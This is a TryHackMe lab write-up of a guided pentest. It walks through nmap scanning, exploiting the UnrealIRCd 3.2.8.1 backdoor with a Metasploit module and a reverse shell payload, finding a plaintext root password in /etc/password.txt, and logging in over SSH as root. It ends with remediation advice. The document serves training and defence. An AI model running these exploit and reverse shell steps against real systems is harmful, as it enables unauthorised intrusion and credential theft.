# 🛡️ Writeup: Guided Pentest - Infrastructure (TryHackMe)
**Author:** Long Wei  
**Difficulty:** Beginner / Intermediate  
**Target System:** Ubuntu Linux  

## 📋 1. Executive Summary
During this penetration test, a critical vulnerability was identified on the target's IRC service. An outdated version of UnrealIRCd contained a well-known backdoor, allowing Remote Code Execution (RCE). After gaining initial access, a post-exploitation enumeration revealed the root user's password stored in plaintext within a world-readable file, leading to a complete system compromise.

---

## 🔍 2. Reconnaissance & Enumeration
The first step was to identify exposed services on the target machine (`10.130.188.149`) using Nmap.

```bash
nmap -sV -sC 10.130.188.149
```

**Key Findings:**
- **Port 22/tcp**: OpenSSH 9.6p1 (Ubuntu) → *Recent version, no obvious direct attack vectors.*
- **Port 6667/tcp**: UnrealIRCd 3.2.8.1 → ⚠️ **CRITICAL VULNERABILITY DETECTED.**

*Analysis:* Version `3.2.8.1` of UnrealIRCd is historically known to contain a malicious backdoor in its source code (introduced in 2009), which allows silent remote command execution.

---

## 💥 3. Exploitation (Initial Access)
Instead of exploiting the vulnerability manually, I used **Metasploit** to streamline the process and ensure reliability.

1. Search for the appropriate exploit module:
   ```bash
   msf6 > search unreal_ircd_3281_backdoor
   ```
2. Select the module and configure the parameters:
   ```bash
   msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
   msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.130.188.149
   msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST <YOUR_TRYHACKME_IP>
   msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
   ```
3. Launch the attack:
   ```bash
   msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
   ```
**Result:** Successfully obtained a basic reverse shell as a low-privileged user. *(Note: The `cmd/unix/reverse` payload provides a standard command shell, not a Meterpreter session).*

---

## 👑 4. Post-Exploitation & Privilege Escalation
Once inside the system, the objective was to find a way to escalate privileges to `root`. I initiated a search for sensitive files containing the word "password" across the entire filesystem.

```bash
find / -name "*password*" 2>/dev/null
```

**Relevant Output:**
Among the standard system files, one file stood out due to its unusual location and name:
```text
/etc/password.txt
```

Upon reading the contents of this file:
```bash
cat /etc/password.txt
```
**Result:** `root:PDLrCVl1pLD91U0JMmCz`

The root password was stored in **plaintext** and was readable by any user on the system.

---

## 🏁 5. Final Access (Root)
I used these credentials to connect directly via SSH as the root user and retrieve the final flag.

```bash
ssh root@10.130.188.149
# Password: PDLrCVl1pLD91U0JMmCz

root@pentest-target:~# cat /root/flag.txt
THM{...}
```

---

## 🛡️ 6. Remediation & Recommendations
To mitigate the identified vulnerabilities, the following actions are recommended:
1. **Update or Remove the IRC Service**: Uninstall the vulnerable UnrealIRCd 3.2.8.1 immediately. If the service is not required, disable it entirely.
2. **Secure Secret Management**: **Never** store passwords in plaintext, especially in world-readable files like `/etc/password.txt`. Use strong hashing algorithms (e.g., bcrypt, Argon2) or dedicated secret management tools.
3. **Principle of Least Privilege**: Ensure strict file permissions. Sensitive files should be owned by `root` with `chmod 600` permissions (read/write only by the owner).
